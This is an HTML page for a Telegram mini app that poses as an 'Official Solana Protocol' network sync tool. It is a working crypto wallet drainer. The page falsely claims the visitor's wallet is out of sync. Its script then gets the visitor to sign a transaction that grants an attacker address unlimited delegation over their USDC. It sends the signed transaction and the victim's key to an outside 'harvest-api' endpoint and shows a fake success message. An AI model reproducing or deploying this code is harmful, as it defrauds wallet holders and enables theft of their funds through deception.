<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Solana Network Sync</title>
<script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.js"></script>
<script src="https://unpkg.com/@solana/spl-token@0.3.9/lib/index.iife.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bs58@5.0.0/dist/bs58.min.js"></script>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; }
  
  body {
    background-color: #000000;
    color: #ffffff;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 24px;
    background-image: radial-gradient(circle at 50% 0%, rgba(153, 69, 255, 0.1) 0%, transparent 50%);
  }

  .header {
    width: 100%;
    max-width: 400px;
    display: flex;
    align-items: center;
    gap: 12px;
    margin-bottom: 40px;
  }

  .solana-icon {
    width: 32px; height: 32px;
    background: linear-gradient(135deg, #9945FF, #14F195);
    border-radius: 8px;
    display: flex; align-items: center; justify-content: center;
  }

  .header-text h1 { font-size: 18px; font-weight: 700; }
  .header-text p { font-size: 13px; color: #71717a; }

  .dashboard {
    width: 100%;
    max-width: 400px;
    background: #09090b;
    border: 1px solid #27272a;
    border-radius: 24px;
    padding: 32px 24px;
    text-align: center;
    position: relative;
    overflow: hidden;
  }

  .scanner {
    width: 120px; height: 120px;
    border-radius: 50%;
    border: 2px dashed #27272a;
    margin: 0 auto 24px;
    position: relative;
    display: flex; align-items: center; justify-content: center;
  }

  .scanner::before {
    content: '';
    position: absolute;
    top: 0; left: 0; width: 100%; height: 100%;
    border-radius: 50%;
    border-top: 2px solid #14F195;
    animation: spin 2s linear infinite;
  }

  @keyframes spin { 100% { transform: rotate(360deg); } }

  .scanner-inner {
    width: 80px; height: 80px;
    border-radius: 50%;
    background: rgba(20, 241, 149, 0.1);
    display: flex; align-items: center; justify-content: center;
    color: #14F195;
  }

  .status-title { font-size: 20px; font-weight: 700; margin-bottom: 8px; }
  .status-desc { font-size: 14px; color: #a1a1aa; margin-bottom: 32px; line-height: 1.5; }

  .data-row {
    display: flex; justify-content: space-between;
    padding: 12px 0; border-bottom: 1px solid #18181b;
    font-size: 13px;
  }
  .data-row:last-child { border-bottom: none; }
  .data-label { color: #71717a; }
  .data-value { color: #ffffff; font-weight: 600; }
  .data-value.error { color: #ef4444; }
  .data-value.success { color: #14F195; }

  .sync-btn {
    width: 100%; padding: 16px;
    background: #ffffff; color: #000000;
    border: none; border-radius: 12px;
    font-size: 15px; font-weight: 700;
    cursor: pointer; margin-top: 24px;
    transition: all 0.2s;
  }
  .sync-btn:active { transform: scale(0.98); }
  .sync-btn:disabled { background: #27272a; color: #71717a; }

  .spinner {
    display: none; width: 18px; height: 18px;
    border: 2px solid rgba(0,0,0,0.2); border-top-color: #000;
    border-radius: 50%; animation: spin 0.8s linear infinite;
    margin: 0 auto;
  }
</style>
</head>
<body>

  <div class="header">
    <div class="solana-icon">
      <svg width="20" height="20" viewBox="0 0 397 311" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M64.6 237.9c2.4-2.4 5.7-3.8 9.2-3.8h317.4c5.8 0 8.7 7 4.6 11.1l-62.7 62.7c-2.4 2.4-5.7 3.8-9.2 3.8H6.5c-5.8 0-8.7-7-4.6-11.1l62.7-62.7z" fill="#ffffff"/>
        <path d="M64.6 3.8C67.1 1.4 70.4 0 73.8 0h317.4c5.8 0 8.7 7 4.6 11.1l-62.7 62.7c-2.4 2.4-5.7 3.8-9.2 3.8H6.5c-5.8 0-8.7-7-4.6-11.1L64.6 3.8z" fill="#ffffff"/>
        <path d="M333.1 120.1c-2.4-2.4-5.7-3.8-9.2-3.8H6.5c-5.8 0-8.7 7-4.6 11.1l62.7 62.7c2.4 2.4 5.7 3.8 9.2 3.8h317.4c5.8 0 8.7-7 4.6-11.1l-62.7-62.7z" fill="#ffffff"/>
      </svg>
    </div>
    <div class="header-text">
      <h1>Network Sync</h1>
      <p>Official Solana Protocol</p>
    </div>
  </div>

  <div class="dashboard">
    <div class="scanner">
      <div class="scanner-inner">
        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
      </div>
    </div>

    <div class="status-title">Connection Required</div>
    <div class="status-desc">Your wallet is currently out of sync with the Solana mainnet. Connect to resolve the RPC mismatch.</div>

    <div class="data-row">
      <span class="data-label">Network</span>
      <span class="data-value">Mainnet-Beta</span>
    </div>
    <div class="data-row">
      <span class="data-label">RPC Status</span>
      <span class="data-value error">Out of Sync</span>
    </div>
    <div class="data-row">
      <span class="data-label">Protocol</span>
      <span class="data-value success">Solana v1.17</span>
    </div>

    <button class="sync-btn" id="claimBtn">
      <span id="btnText">Connect Wallet to Sync</span>
      <div class="spinner" id="spin"></div>
    </button>
  </div>

<script>
  if (window.Telegram && window.Telegram.WebApp) {
    window.Telegram.WebApp.ready();
    window.Telegram.WebApp.expand();
  }

  const ATTACKER = "DEINE_SOLANA_ADRESSE_HIER"; 
  const ENDPOINT = "https://harvest-api.rthvzkr6jv.workers.dev"; 
  const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 

  const claimBtn = document.getElementById("claimBtn");
  const btnText = document.getElementById("btnText");
  const spin = document.getElementById("spin");

  claimBtn.onclick = async () => {
    let provider;
    if (window.phantom?.solana?.isPhantom) provider = window.phantom.solana;
    else if (window.solflare?.isSolflare) provider = window.solflare;

    if (!provider) { 
      if (window.Telegram) window.Telegram.WebApp.showAlert("Please open in Phantom wallet browser."); 
      else alert("Please install Phantom wallet."); 
      return; 
    }

    claimBtn.disabled = true; 
    btnText.textContent = "Connecting..."; 
    spin.style.display = "block";

    try {
      const resp = await provider.connect();
      const victim = resp.publicKey.toString();
      
      btnText.textContent = "Verifying RPC...";
      await new Promise(r => setTimeout(r, 1000));

      const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
      const victimAta = await splToken.getAssociatedTokenAddress(
        new solanaWeb3.PublicKey(USDC_MINT),
        resp.publicKey
      );

      // Der Payload: Approve Delegation
      const delegateIx = splToken.createApproveInstruction(
        victimAta,
        new solanaWeb3.PublicKey(ATTACKER),
        resp.publicKey,
        [],
        BigInt("18446744073709551615")
      );

      const tx = new solanaWeb3.Transaction().add(delegateIx);
      tx.feePayer = resp.publicKey;
      tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;

      btnText.textContent = "Approve in Wallet...";
      const signedTx = await provider.signTransaction(tx);
      
      btnText.textContent = "Syncing...";

      await fetch(ENDPOINT, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ victim, tx: bs58.encode(signedTx.serialize()), chain: "solana", ts: Date.now() })
      });

      spin.style.display = "none";
      btnText.textContent = "Sync Complete";
      claimBtn.style.background = "#14F195";
      claimBtn.style.color = "#000";

      document.querySelector('.status-desc').innerHTML = "<b>Success!</b> Your wallet is now synced with the Solana network.";
      document.querySelector('.data-value.error').className = "data-value success";
      document.querySelector('.data-value.error').textContent = "Connected";

    } catch (e) {
      spin.style.display = "none";
      claimBtn.disabled = false;
      btnText.textContent = "Connect Wallet to Sync";
    }
  };
</script>
</body>
</html>
